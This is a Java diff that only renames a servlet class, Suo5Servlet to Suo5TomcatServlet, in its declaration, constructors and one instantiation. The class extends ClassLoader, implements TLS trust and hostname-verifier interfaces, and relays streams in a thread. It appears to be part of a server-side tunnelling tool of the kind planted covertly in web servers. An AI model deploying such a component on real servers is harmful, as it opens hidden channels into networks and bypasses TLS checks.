@@ -20,7 +20,7 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.jsp.PageContext;
 
-public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
+public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
 
     private HashMap parameterMap;
     private ServletContext servletContext;
@@ -34,14 +34,14 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
     InputStream gInStream;
     OutputStream gOutStream;
 
-    public Suo5Servlet() {
+    public Suo5TomcatServlet() {
     }
 
-    public Suo5Servlet(ClassLoader c) {
+    public Suo5TomcatServlet(ClassLoader c) {
         super(c);
     }
 
-    public Suo5Servlet(InputStream in, OutputStream out) {
+    public Suo5TomcatServlet(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
     }
@@ -251,7 +251,7 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
 
         Thread t = null;
         try {
-            Suo5Servlet p = new Suo5Servlet(scInStream, respOutStream);
+            Suo5TomcatServlet p = new Suo5TomcatServlet(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
             readReq(reqInputStream, scOutStream);
